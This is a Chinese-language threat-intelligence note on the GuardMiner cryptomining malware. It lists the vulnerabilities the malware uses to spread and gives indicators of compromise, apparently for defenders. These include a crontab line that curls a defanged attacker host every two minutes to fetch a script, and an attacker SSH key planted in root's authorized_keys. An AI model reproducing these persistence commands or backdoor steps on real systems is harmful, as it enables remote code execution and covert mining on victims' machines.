## GuardMiner

2021-3-8

GuardMiner最早出现于2019年，至今已活跃超过2年，该挖矿木马通过Go语言编写的二进制程序针对Windows平台和Linux平台进行攻击传播，通过crontab定时任务以及安装SSH公钥后门进行持久化控制，并且还会利用比特币的交易记录来动态更新C2地址。

分析发现，GuardMiner挖矿团伙最新的攻击活动利用了多达9种攻击传播手法：

1) CCTV设备RCE漏洞；
2) Redis未授权访问漏洞；
3) Drupal框架CVE-2018-7600漏洞；
4) Hadoop未授权访问漏洞；
5) Spring RCE漏洞CVE-2018-1273；
6) Thinkphp V5高危漏洞；
7) WebLogic RCE漏洞CVE-2017-10271；
8) SQL Server弱口令爆破；
9) Elasticsearch RCE漏洞 CVE-2015-1427、CVE-2014-3120

文件和进程：
/etc/phpguard
/etc/phpupdate
/etc/networkmanager

Crontab任务：
*/30 * * * * sh /etc/newdat.sh
*/2 * * * * curl -fsSL hxxp://h.epelcdn.com/dd210131/pm.sh

SSH公钥（/root/.ssh/authorized_keys）：
AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17

![GuardMiner原理图](https://github.com/G4rb3n/Malware-Picture/blob/master/Miner/GuardMiner/2103/guardminer.png)

参考链接
```
https://s.tencent.com/research/report/1265.html
```